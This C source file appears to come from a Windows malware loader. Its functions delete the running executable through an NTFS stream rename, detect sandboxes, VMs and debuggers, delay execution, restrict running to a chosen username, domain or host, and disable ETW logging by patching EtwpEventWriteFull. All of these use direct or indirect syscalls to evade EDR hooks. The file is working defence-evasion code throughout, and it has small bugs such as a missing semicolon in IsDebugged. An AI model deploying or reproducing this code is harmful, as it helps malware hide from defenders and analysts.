#include <stdio.h>
#include <shlwapi.h>
#include "structs.h"
#include "main.h"

#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Shlwapi.lib")


/*---------------------------------------------------------
Simple function to delete the file on disk after execution
TODO: Remove the usage of windows APIs
---------------------------------------------------------*/
#ifdef SELF_DELETE
BOOL DeleteSelf() {
    DEBUG_PRINT("[*] Deleting file on-disk.\n");

    HANDLE fHand = NULL;
    WCHAR path[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO DelFile = { 0 };
    PFILE_RENAME_INFO pfInfo = NULL;
    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
    SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sizeof(wchar_t) * (wcslen(NewStream) + 1);
    OBJECT_ATTRIBUTES objAttributes = { 0 };
    IO_STATUS_BLOCK ioStatusBlock = { 0 };
    UNICODE_STRING filePath = { 0 };
    NTSTATUS status = NULL;

    DEBUG_PRINT("[*] Allocating heap for file disposition info.\n");

    //Allocate some space for file rename info
    pfInfo = HeapAlloc(GetHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pfInfo) {
        DEBUG_PRINT("[!] Heap allocation failed: %d.\n", GetLastError());
        return FALSE;
    }

    //Zero out the structs
    mymemcpy(path, NULL, sizeof(path));
    mymemcpy(&DelFile, NULL, sizeof(FILE_DISPOSITION_INFO));

    //Mark file to be deleted
    DelFile.DeleteFile = TRUE;

    //Initialize new name of data stream
    pfInfo->FileNameLength = wcslen(NewStream) * sizeof(wchar_t); //sizeof(NewStream);
    pfInfo->RootDirectory = NULL;
    pfInfo->ReplaceIfExists = TRUE;
    mymemcpy(pfInfo->FileName, NewStream, pfInfo->FileNameLength);

    DEBUG_PRINT("[*] Getting current filename.\n");

    //Get current filename
    if (GetModuleFileName(NULL, path, MAX_PATH * 2) == 0) {
        DEBUG_PRINT("[!] Couldnt get file name: %d.\n", GetLastError());
        return FALSE;
    }
    WDEBUG_PRINT(L"[*] File path: %s\n", path);

    //Construct NT path
    WCHAR temp[MAX_PATH] = { 0 };
    swprintf_s(temp, (wcslen(path) * sizeof(WCHAR)), L"\\??\\%s", path);

    filePath.Buffer = temp;
    filePath.Length = wcslen(filePath.Buffer) * sizeof(WCHAR);
    filePath.MaximumLength = filePath.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&objAttributes, &filePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    //Get a handle to the file
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtOpenFile.dwSSn, g_Fun.NtOpenFile.pSyscallIndJmp);
    status = InvokeI(&fHand, DELETE | SYNCHRONIZE, &objAttributes, &ioStatusBlock, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtOpenFile.dwSSn);
    status = InvokeD(&fHand, DELETE | SYNCHRONIZE, &objAttributes, &ioStatusBlock, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Failed opening file: 0x%X\n", status);
        return FALSE;
    }



    WDEBUG_PRINT(L"[*] Renaming :$DATA stream to: %s.\n", NEW_STREAM);

    //Renaming DATA stream
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtSetInformationFile.dwSSn, g_Fun.NtSetInformationFile.pSyscallIndJmp);
    status = InvokeI(fHand, &ioStatusBlock, pfInfo, sRename, FileRenameInformation);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtSetInformationFile.dwSSn);
    status = InvokeD(fHand, &ioStatusBlock, pfInfo, sRename, FileRenameInformation);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Failed setting file information: 0x%X\n", status);
        return FALSE;
    }

    //Close the file handle
#ifdef SYSCALL_INDIRECT
   //Indirect syscall method
    GetSSNI(g_Fun.NtClose.dwSSn, g_Fun.NtClose.pSyscallIndJmp);
    InvokeI(fHand);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtClose.dwSSn);
    InvokeD(fHand);
#endif


    if (GetModuleFileName(NULL, path, MAX_PATH * 2) == 0) {
        DEBUG_PRINT("[!] Couldnt get file name: %d.\n", GetLastError());
        return FALSE;
    }


    DEBUG_PRINT("[*] Opening new handle to file.\n");

    //Open new handle to the current file
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtOpenFile.dwSSn, g_Fun.NtOpenFile.pSyscallIndJmp);
    status = InvokeI(&fHand, DELETE | SYNCHRONIZE, &objAttributes, &ioStatusBlock, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtOpenFile.dwSSn);
    status = InvokeD(&fHand, DELETE | SYNCHRONIZE, &objAttributes, &ioStatusBlock, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Failed opening file: 0x%X\n", status);
        return FALSE;
    }

    DEBUG_PRINT("[*] Marking file for deletion.\n");

    //Mark for deletion after the handle is closed
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtSetInformationFile.dwSSn, g_Fun.NtSetInformationFile.pSyscallIndJmp);
    status = InvokeI(fHand, &ioStatusBlock, &DelFile, sizeof(DelFile), FileDispositionInformation);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtSetInformationFile.dwSSn);
    status = InvokeD(fHand, &ioStatusBlock, &DelFile, sizeof(DelFile), FileDispositionInformation);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Failed setting file information: 0x%X\n", status);
        return FALSE;
    }

    //Close the file handle so it can be deleted
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtClose.dwSSn, g_Fun.NtClose.pSyscallIndJmp);
    InvokeI(fHand);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtClose.dwSSn);
    InvokeD(fHand);
#endif
    DEBUG_PRINT("[*] Done!\n");
    HeapFree(GetHeap(), 0, pfInfo);
    return TRUE;
}
#endif


/*------------------------------------------
 Check the system's resources
 If they are too low, possible sandbox or VM
-------------------------------------------*/
BOOL CheckResources() {
    MEMORYSTATUSEX mem = { .dwLength = sizeof(MEMORYSTATUSEX) };

    GlobalMemoryStatusEx(&mem);

    DWORD mem_th = 1073741824; //(2 * 1073741824); //2GB

    if (envVars.numProcessors < 2 || (DWORD)mem.ullTotalPhys < mem_th) {
        DEBUG_PRINT("[!] Low resources detected, sandbox ?.\n");
        return TRUE; // System is running with less than 2 cpus or less than 2 GB of ram
    }
    return FALSE;
}


/*--------------------------------------------
 Check if the program's name has been changed
 Most sandboxes are using hashes for the name
 If there are more than 5 digits return TRUE
--------------------------------------------*/
BOOL CheckName() {
    CHAR* path[MAX_PATH * 3];
    CHAR FileName[MAX_PATH];
    DWORD digits = 0;

    GetModuleFileNameA(NULL, path, MAX_PATH * 3);
    if (lstrlen(PathFindFileName(path)) < MAX_PATH) {
        lstrcpyA(FileName, PathFindFileNameA(path));
    }

    //Count digits
    for (int i = 0; i < lstrlenA(FileName); i++) {
        if (isdigit(FileName[i])) {
            digits++;
        }
    }

    //Max allowed are 5
    if (digits > 5) {
        DEBUG_PRINT("[!] Too many digits in program name, hashed ?.\n");
        return TRUE; //Possible sandbox
    }
    return FALSE;
}


/*------------------------------------------------------
 Function to determine if the process is being
 debugged, trough NtQueryInformationProcess by
 querying ProcessDebugPort and ProcessDebugObjectHandle
------------------------------------------------------*/
BOOL IsDebugged() {
#define ProcessDebugPort 7
#define ProcessDebugObjectHandle 30

    DWORD64 DebugPort;
    DWORD64 DebugHandle;
    NTSTATUS status = 0;


#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtQueryInformationProcess.dwSSn, g_Fun.NtQueryInformationProcess.pSyscallIndJmp);
    InvokeI((HANDLE)-1, ProcessDebugPort, &DebugPort, sizeof(DWORD64), NULL);
    InvokeI((HANDLE)-1, ProcessDebugObjectHandle, &DebugHandle, sizeof(DWORD64), NULL);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtQueryInformationProcess.dwSSn);
    InvokeD((HANDLE)-1, ProcessDebugPort, &DebugPort, sizeof(DWORD64), NULL);
    InvokeD((HANDLE)-1, ProcessDebugObjectHandle, &DebugHandle, sizeof(DWORD64), NULL)
#endif


        if (DebugPort != NULL || DebugHandle != NULL) {
            DEBUG_PRINT("[!] Possible debugger detected.\n");
            return TRUE;
        }
}




/*------------------------------------------
 Simple function to delay execution,
 based on NtWaitForSingleObject
------------------------------------------*/
#ifdef WAIT
BOOL Delay(FLOAT minutes) {

    DEBUG_PRINT("[*] Delaying execution for: %f minutes.\n", minutes);

    DWORD ms = minutes * 60000;
    HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
    LONGLONG delay = NULL;
    LARGE_INTEGER delayInt = { 0 };

    DWORD T0 = 0, T1 = 0;

    delay = ms * 10000;
    delayInt.QuadPart = -delay;

    T0 = GetTickCount64();

#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtWaitForSingleObject.dwSSn, g_Fun.NtWaitForSingleObject.pSyscallIndJmp);
    InvokeI(hEvent, FALSE, &delayInt);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtWaitForSingleObject.dwSSn);
    InvokeD(hEvent, FALSE, &delayInt);
#endif

    T1 = GetTickCount64();

    if ((DWORD)(T1 - T0) < ms) {
        DEBUG_PRINT("[!] Delay skipped, possibly fast forwarded.\n");
        return FALSE;
    }
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtClose.dwSSn, g_Fun.NtClose.pSyscallIndJmp);
    InvokeI(hEvent);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtClose.dwSSn);
    InvokeD(hEvent);
#endif

    DEBUG_PRINT("[*] Waited for %f minutes, proceeding with execution.\n", minutes);
    return TRUE;
}
#endif


/*-------------------------------
  Simple function to get all
  environemnt variables from PEB
-------------------------------*/
BOOL GetEnv(PENV envVars) {
#define COMPARE(env, str) (*((ULONG_PTR*)(env)) == *((ULONG_PTR*)(str)) && *((env) + sizeof(*(str)) / sizeof(WCHAR)) == L'=')

    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PBYTE env = (PBYTE)pPeb->ProcessParameters->Environment;
    PBYTE pProcessors = NULL,
        pUsername = NULL,
        pComputerName = NULL,
        pUserdomain = NULL;


    while (TRUE) {
        //len of the env variable
        int size = lstrlenW(env);

        if (!size) {
            env = NULL;
            break;
        }

        //wprintf(L"%s \n\n", env);
        if (my_memcmp(env, L"NUMBER_OF", 16) == 0) {
            pProcessors = env;
        }
        else if (my_memcmp(env, L"COMPUTERNAME", 16) == 0) {
            pComputerName = env;
        }
        else if (my_memcmp(env, L"USERNAME", 16) == 0) {
            pUsername = env;
        }
        else if (my_memcmp(env, L"USERDOMAIN", 16) == 0) {
            pUserdomain = env;
        }

        env = (PBYTE)env + (size * sizeof(WCHAR)) + sizeof(WCHAR);
    }

    //Process env variables and store them in the struct
    if (pProcessors) {
        int length = lstrlenW(pProcessors) * sizeof(WCHAR);

        for (int i = 0; i <= length; i++) {
            if ((WCHAR)pProcessors[i] == (WCHAR)L'=') {
                envVars->numProcessors = (DWORD)wcstoul((PWSTR)&pProcessors[i + sizeof(WCHAR)], NULL, 10);
                WDEBUG_PRINT(L"[*] Extracted from environment Number of processors: %d\n", envVars->numProcessors);
            }
        }
    }
    else {
        DEBUG_PRINT("[!] Could not get NUMBER_OF_PROCESSORS env variable.");
        return FALSE;
    }

    if (pUsername) {
        int length = lstrlenW(pUsername) * sizeof(WCHAR);

        for (int i = 0; i <= length; i++) {
            if ((WCHAR)pUsername[i] == (WCHAR)L'=') {
                envVars->Username = (PWSTR)&pUsername[i + sizeof(WCHAR)];
                WDEBUG_PRINT(L"[*] Extracted from environment Username: %ws\n", envVars->Username);
            }
        }
    }
    else {
        DEBUG_PRINT("[!] Could not get USERNAME env variable.");
        return FALSE;
    }

    if (pComputerName) {
        int length = lstrlenW(pComputerName) * sizeof(WCHAR);

        for (int i = 0; i <= length; i++) {
            if ((WCHAR)pComputerName[i] == (WCHAR)L'=') {
                envVars->PCName = (PWSTR)&pComputerName[i + sizeof(WCHAR)];
                WDEBUG_PRINT(L"[*] Extracted from environment ComputerName: %ws\n", envVars->PCName);
            }
        }
    }
    else {
        DEBUG_PRINT("[!] Could not get COMPUTERNAME env variable.");
        return FALSE;
    }

    if (pUserdomain) {
        int length = lstrlenW(pUserdomain) * sizeof(WCHAR);

        for (int i = 0; i <= length; i++) {
            if ((WCHAR)pUserdomain[i] == (WCHAR)L'=') {
                envVars->Userdomain = (PWSTR)&pUserdomain[i + sizeof(WCHAR)];
                WDEBUG_PRINT(L"[*] Extracted from environment Userdomain: %ws\n", envVars->Userdomain);
            }
        }
    }
    else {
        DEBUG_PRINT("[!] Could not get USERDOMAIN env variable.");
        return FALSE;
    }
    return TRUE;
}


/*------------------------------
  Function to implement simple
  guardrails
------------------------------*/
#ifdef GUARDRAILS
BOOL GuardRails() {

    if (strcmp("Username", GUARDRAILS) == 0) {
        DEBUG_PRINT("[*] Username guardrail check.\n");
        if (wcscmp(GUARDVALUE, envVars.Username) == 0) {
            return TRUE;
        }
        else {
            WDEBUG_PRINT(L"[!] %s dont match guardrail value: %s\n", envVars.Username, GUARDVALUE);
            return FALSE;
        }
    }
    else if (strcmp("Userdomain", GUARDRAILS) == 0) {
        DEBUG_PRINT("[*] Userdomain guardrail check.\n");
        if (wcscmp(GUARDVALUE, envVars.Userdomain) == 0) {
            return TRUE;
        }
        else {
            WDEBUG_PRINT(L"[!] %s dont match guardrail value: %s\n", envVars.Userdomain, GUARDVALUE);
            return FALSE;
        }
    }
    else if (strcmp("PCName", GUARDRAILS) == 0) {
        DEBUG_PRINT("[*] PCName guardrail check.\n");
        if (wcscmp(GUARDVALUE, envVars.PCName) == 0) {
            return TRUE;
        }
        else {
            WDEBUG_PRINT(L"[!] %s dont match guardrail value: %s\n", envVars.PCName, GUARDVALUE);
            return FALSE;
        }
    }
    else {
        DEBUG_PRINT("[!] Guardrails should be one of: Username, Userdomain, PCName\n");
        return FALSE;
    }
    return FALSE;
}
#endif


/*-----------------------------------------------
  Function to disable ETW trough patching
  the EtwpEvenWriteFull function start
  The process is as follows:
   1. Retrieve the address of EteEventWrite
   2. Use it to find the last ret instruction
   3. Start upwards search from the address
   of the found ret for a call EtwpEvenWriteFull
   instruction, this is the offset to the func
   4. Calcuate the address of EtwpEventWriteFull
   trough the found offset
   5. Change the memory protection to RW
   6. Write the patch which is: xor eax, eax; ret
   7. Revert back the memory protection
-----------------------------------------------*/
#ifdef PATCH_ETW
BOOL PatchETW() {

    NTSTATUS status = NULL;
    BYTE patch[3] = {
        0x33, 0xC0,  // xor eax, eax
        0xC3         // ret 
    };
    DWORD old = 0;
    SIZE_T pSize = sizeof(patch);
    PBYTE pEtwEventWrite = NULL,
        pEtwpEventWriteFull = NULL;
    DWORD dwEtwpOffset = 0;

    DEBUG_PRINT("[*] Patching ETW.\n");
    DEBUG_PRINT("\t> Searching for EtwEventWrite function addresses.\n");
    //Get the function's addresses
    for (size_t i = 0; i < g_NtConfig.dwNamesNumber; i++) {

        PCHAR funcName = (PCHAR)(g_NtConfig.uModule + g_NtConfig.pdwNamesArray[i]);
        PVOID funcAddr = (PVOID)(g_NtConfig.uModule + g_NtConfig.pdwAddressesArray[g_NtConfig.pwOrdinalsArray[i]]);
        if (HashA(funcName) == EtwEventWrite_H) {
            pEtwEventWrite = funcAddr;
            break;
        }
    }

    DEBUG_PRINT("\t> Searching for EtwpEventWriteFull from start address: 0x%p\n", pEtwEventWrite);

    int i = 0;
    while (TRUE) {
        // Search for the last ret instruction
        // 0xC3 - ret
        // 0xCC - int3
        if (pEtwEventWrite[i] == 0xC3 && pEtwEventWrite[i + 1] == 0xCC) {
            break;
        }
        i++;
    }

    //Search upwards for the call EtwpEventWriteFull instruction
    while (i) {
        //0xE8 - call
        if (pEtwEventWrite[i] == 0xE8) {
            pEtwEventWrite = (PBYTE)&pEtwEventWrite[i];
            break;
        }
        i--;
    }

    //Double check that we have what we need
    if (pEtwEventWrite != NULL && pEtwEventWrite[0] != 0xE8) {
        DEBUG_PRINT("[!] Could not determine the start address of EtwpEventWriteFull\n");
        return FALSE;
    }

    //Attempting to find the offset to EtwpEventWriteFull
    pEtwEventWrite++;

    dwEtwpOffset = *(DWORD*)pEtwEventWrite;

    //Add the size of the offset to reach the end of the call instruction
    pEtwEventWrite += sizeof(DWORD);

    //Calculate the address of EtwpEventWriteFull
    pEtwpEventWriteFull = pEtwEventWrite + dwEtwpOffset;

    DEBUG_PRINT("\t> Address found: 0x%p applying the patch.\n", pEtwpEventWriteFull);

    //Change memory protection to allow writing
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtProtectVirtualMemory.dwSSn, g_Fun.NtProtectVirtualMemory.pSyscallIndJmp);
    status = InvokeI((HANDLE)-1, &pEtwpEventWriteFull, &pSize, PAGE_READWRITE, &old);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtProtectVirtualMemory.dwSSn);
    status = InvokeD((HANDLE)-1, &pEtwpEventWriteFull, &pSize, PAGE_READWRITE, &old);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Failed changing memory protection for EtwEventWrite: 0x%X\n", status);
        return FALSE;
    }

    //Write the patch
    DWORD written = 0;
#ifdef SYSCALL_INDIRECT
    GetSSNI(g_Fun.NtWriteVirtualMemory.dwSSn, g_Fun.NtWriteVirtualMemory.pSyscallIndJmp);
    status = InvokeI((HANDLE)-1, pEtwpEventWriteFull, patch, sizeof(patch), &written);

#elif !defined(SYSCALL_INDIRECT)
    GetSSND(g_Fun.NtWriteVirtualMemory.dwSSn);
    status = InvokeD((HANDLE)-1, pEtwpEventWriteFull, patch, sizeof(patch), &written);

#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Writing ETW patch failed: 0x%X\n", status);
        return FALSE;
    }

    DEBUG_PRINT("\t> Patch bytes written: %d\n", written);

    //Revert memory protection
#ifdef SYSCALL_INDIRECT
    //Indirect syscall method
    GetSSNI(g_Fun.NtProtectVirtualMemory.dwSSn, g_Fun.NtProtectVirtualMemory.pSyscallIndJmp);
    status = InvokeI((HANDLE)-1, &pEtwpEventWriteFull, &pSize, old, &old);

#elif !defined(SYSCALL_INDIRECT)
    //Direct syscall method
    GetSSND(g_Fun.NtProtectVirtualMemory.dwSSn);
    status = InvokeD((HANDLE)-1, &pEtwpEventWriteFull, &pSize, old, &old);
#endif
    if (status != 0x00) {
        DEBUG_PRINT("[!] Failed reverting memory protection for EtwEventWrite: 0x%X\n", status);
        return FALSE;
    }

    DEBUG_PRINT("[*] Patching is complete.\n");
    return TRUE;
}
#endif
